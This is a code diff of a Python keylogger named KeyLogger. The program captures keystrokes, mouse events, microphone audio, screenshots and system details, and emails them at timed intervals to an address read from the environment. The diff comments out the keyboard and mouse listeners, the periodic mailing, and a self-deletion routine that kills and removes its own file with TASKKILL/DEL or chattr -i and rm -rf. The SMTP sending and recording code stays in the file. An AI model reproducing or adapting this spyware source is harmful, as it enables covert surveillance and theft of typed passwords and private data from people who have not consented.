@@ -3,12 +3,12 @@ import os
 import platform
 import smtplib
 import socket
-import threading
+# import threading
 import wave
 import pyscreenshot
 import sounddevice as sd
-from pynput import keyboard
-from pynput.keyboard import Listener
+# from pynput import keyboard
+# from pynput.keyboard import Listener
 from dotenv import load_dotenv
 # from email import encoders
 # from email.mime.base import MIMEBase
@@ -24,13 +24,13 @@ SMTP_SERVER = os.getenv("SMTP_SERVER")
 SMTP_PORT = os.getenv("SMTP_PORT")
 EMAIL_SENDER = os.getenv("EMAIL_SENDER")
 EMAIL_RECEIVER = os.getenv("EMAIL_RECEIVER")
-SEND_REPORT_EVERY = 60  # as in seconds
+SEND_REPORT_EVERY = 60  # seconds
 
 
 class KeyLogger:
     def __init__(self, time_interval, email, password):
         self.interval = time_interval
-        self.log = "KeyLogger Started..."
+        self.log = "KeyLogger Started...\n"
         self.email = email
         self.password = password
 
@@ -76,10 +76,11 @@ class KeyLogger:
             server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, message)
 
     def report(self):
-        self.send_mail(self.email, self.password, "\n\n" + self.log)
+        # self.send_mail(self.email, self.password, "\n\n" + self.log)
+        print(self.log)
         self.log = ""
-        timer = threading.Timer(self.interval, self.report)
-        timer.start()
+        # timer = threading.Timer(self.interval, self.report)
+        # timer.start()
 
     def system_information(self):
         hostname = socket.gethostname()
@@ -87,11 +88,11 @@ class KeyLogger:
         processor = platform.processor()
         system = platform.system()
         machine = platform.machine()
-        self.appendlog(hostname)
-        self.appendlog(ip)
-        self.appendlog(processor)
-        self.appendlog(system)
-        self.appendlog(machine)
+        self.appendlog('hostname = ' + hostname + '\n')
+        self.appendlog('ip = ' + ip + '\n')
+        self.appendlog('processor = ' + processor + '\n')
+        self.appendlog('system = ' + system + '\n')
+        self.appendlog('machine = ' + machine + '\n')
 
     def microphone(self):
         fs = 44100
@@ -111,34 +112,37 @@ class KeyLogger:
         self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)
 
     def run(self):
-        keyboard_listener = keyboard.Listener(on_press=self.save_data)
-        with keyboard_listener:
-            self.report()
-            keyboard_listener.join()
-        with Listener(
-            on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll
-        ) as mouse_listener:
-            mouse_listener.join()
+        # keyboard_listener = keyboard.Listener(on_press=self.save_data)
+        # with keyboard_listener:
+        #     self.report()
+        #     keyboard_listener.join()
+        # with Listener(
+        #     on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll
+        # ) as mouse_listener:
+        #     mouse_listener.join()
 
-        if os.name == "nt":
-            try:
-                pwd = os.path.abspath(os.getcwd())
-                os.system("cd " + pwd)
-                os.system("TASKKILL /F /IM " + os.path.basename(__file__))
-                print("File was closed.")
-                os.system("DEL " + os.path.basename(__file__))
-            except OSError:
-                print("File is close.")
-        else:
-            try:
-                pwd = os.path.abspath(os.getcwd())
-                os.system("cd " + pwd)
-                os.system("pkill leafpad")
-                os.system("chattr -i " + os.path.basename(__file__))
-                print("File was closed.")
-                os.system("rm -rf" + os.path.basename(__file__))
-            except OSError:
-                print("File is close.")
+        # if os.name == "nt":
+        #     try:
+        #         pwd = os.path.abspath(os.getcwd())
+        #         os.system("cd " + pwd)
+        #         os.system("TASKKILL /F /IM " + os.path.basename(__file__))
+        #         print("File was closed.")
+        #         os.system("DEL " + os.path.basename(__file__))
+        #     except OSError:
+        #         print("File is close.")
+        # else:
+        #     try:
+        #         pwd = os.path.abspath(os.getcwd())
+        #         os.system("cd " + pwd)
+        #         os.system("pkill leafpad")
+        #         os.system("chattr -i " + os.path.basename(__file__))
+        #         print("File was closed.")
+        #         os.system("rm -rf" + os.path.basename(__file__))
+        #     except OSError:
+        #         print("File is close.")
+
+        self.system_information()
+        self.report()
 
 
 keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
